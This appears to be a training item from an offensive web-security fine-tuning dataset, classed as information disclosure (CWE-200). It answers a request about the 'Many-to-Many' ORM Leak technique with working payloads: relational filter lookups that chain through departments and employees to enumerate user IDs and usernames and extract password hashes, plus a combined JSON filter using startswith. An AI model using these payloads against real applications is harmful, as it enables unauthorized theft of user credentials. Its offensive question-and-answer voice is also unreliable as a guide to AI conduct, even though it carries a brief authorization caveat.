# INFO_DISCLOSURE — web_offensive_elite_v2_sft

- source: web_offensive_elite_v2_sft
- class: info_disclosure
- cwe: CWE-200

## Scenario

Help me understand Many-to-Many as it relates to ORM Leak, with the payloads from the field.

## Analysis / Response

**Many-to-Many** — this technique applies to ORM Leak. Use the following only against systems you are explicitly authorized to test. Here is the approach along with the concrete payloads from the reference:

Almost the same thing but you need to filter more.

* Get the user IDS: `created_by__departments__employees__user__id`
* For each ID, get the username: `created_by__departments__employees__user__username`
* Finally, leak their password hash: `created_by__departments__employees__user__password`

Use multiple filters in the same request:

```json
{
  "created_by__departments__employees__user__username__startswith": "p",
  "created_by__departments__employees__user__id": 1
}
```
